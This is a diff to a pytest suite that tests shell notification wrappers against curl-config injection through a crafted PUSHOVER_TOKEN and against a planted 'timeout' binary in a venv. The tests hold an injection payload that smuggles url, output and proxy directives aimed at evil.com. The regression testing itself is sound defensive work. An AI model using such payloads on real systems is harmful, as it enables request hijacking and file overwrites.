@@ -451,6 +451,10 @@ class TestNotifyPhaseIsFenced:
         assert first[curl_i + 1] == "-q", (wrapper.name, first)
         assert first[curl_i + 2] == "--config", (wrapper.name, first)
         assert first[curl_i + 3] == "-", (wrapper.name, first)
+        assert r"${v//\\/\\\\}" in curl, wrapper.name
+        assert r"${v//\"/\\\"}" in curl, wrapper.name
+        assert r"${v//$'\n'/ }" in curl, wrapper.name
+        assert "for k in token user title message" in curl, wrapper.name
 
     @pytest.mark.parametrize("wrapper", WRAPPERS, ids=lambda p: p.name)
     def test_gh_and_timeout_are_snapshotted_before_venv_path(self, wrapper: Path):
@@ -463,6 +467,8 @@ class TestNotifyPhaseIsFenced:
         assert 'net_bounded "$GH_BIN"' in body, wrapper.name
         assert "net_bounded gh " not in body, wrapper.name
         assert '"$TIMEOUT_BIN"' in body, wrapper.name
+        assert '"$TIMEOUT_BIN" -k' in body, wrapper.name
+        assert "timeout -k" not in body, wrapper.name
 
     @pytest.mark.parametrize("wrapper", WRAPPERS, ids=lambda p: p.name)
     def test_notify_cred_strips_cr_not_a_quoted_newline(self, wrapper: Path):
@@ -492,6 +498,54 @@ class TestNotifyPhaseIsFenced:
         )
         assert proc.returncode == 0, proc.stderr
         assert proc.stdout.splitlines() == ["tok-from-crlf", "user-from-crlf"], proc.stdout
+
+    @pytest.mark.parametrize("wrapper", WRAPPERS, ids=lambda p: p.name)
+    def test_notify_curl_quote_newline_cannot_inject_curl_directives(
+        self, wrapper: Path, tmp_path: Path
+    ):
+        src = wrapper.read_text(encoding="utf-8")
+        start = src.index("_notify_cred() {")
+        end = src.index("\nnotify_phase() {", start)
+        curl_log = tmp_path / "curl.log"
+        curl_stub = tmp_path / "curl"
+        curl_stub.write_text(_curl_log_stub(curl_log), encoding="utf-8")
+        curl_stub.chmod(curl_stub.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
+        fns = src[start:end].replace("/usr/bin/curl", str(curl_stub))
+        payload = 'foo"\nurl = "http://evil.com"\noutput = "/tmp/pwn"\nproxy = "http://evil.com"'
+        (tmp_path / ".env").write_text(
+            f"PUSHOVER_USER=test-user\nPUSHOVER_TOKEN={payload}\n",
+            encoding="utf-8",
+        )
+        script = tmp_path / "run.sh"
+        script.write_text(
+            "#!/usr/bin/env bash\nset -euo pipefail\n"
+            f'WEEKEND_ROOT="{tmp_path}"\n'
+            + fns
+            + '\n_notify_curl testloop audit OK "" ""\n',
+            encoding="utf-8",
+        )
+        proc = subprocess.run(
+            ["/bin/bash", str(script)],
+            env={
+                **os.environ,
+                "PUSHOVER_USER": "test-user",
+                "PUSHOVER_TOKEN": payload,
+            },
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        assert proc.returncode == 0, proc.stderr
+        dump = curl_log.read_text(encoding="utf-8") if curl_log.exists() else ""
+        url_lines = [
+            ln.strip()
+            for ln in dump.splitlines()
+            if ln.strip().startswith("url ") or ln.strip().startswith("url=")
+        ]
+        assert url_lines == ['url = "https://api.pushover.net/1/messages.json"'], dump
+        assert 'url = "http://evil' not in dump, dump
+        assert 'output = "/tmp/pwn"' not in dump, dump
+        assert 'proxy = "http://evil.com"' not in dump, dump
 
     def test_rewritten_clone_notifier_is_not_execed(self, tmp_path: Path):
         clone = tmp_path / "clone"
@@ -689,6 +743,14 @@ class TestNotifyPhaseIsFenced:
             encoding="utf-8",
         )
         (venv_bin / "gh").chmod(0o755)
+        timeout_planted = tmp_path / "PWNED_VENV_TIMEOUT"
+        (venv_bin / "timeout").write_text(
+            "#!/bin/sh\n"
+            f"echo PWN > '{timeout_planted}'\n"
+            "exit 0\n",
+            encoding="utf-8",
+        )
+        (venv_bin / "timeout").chmod(0o755)
         bin_dir = tmp_path / "bin"
         bin_dir.mkdir()
         gh_log = tmp_path / "gh.log"
@@ -739,6 +801,7 @@ class TestNotifyPhaseIsFenced:
         )
         assert proc.returncode == 0, (proc.returncode, proc.stdout, proc.stderr)
         assert not planted.exists(), "venv gh must not run after the snapshot"
+        assert not timeout_planted.exists(), "venv timeout must not run the wall-clock"
         calls = gh_log.read_text(encoding="utf-8") if gh_log.exists() else ""
         assert "issue comment" in calls, calls
         assert "PWN" not in calls, calls
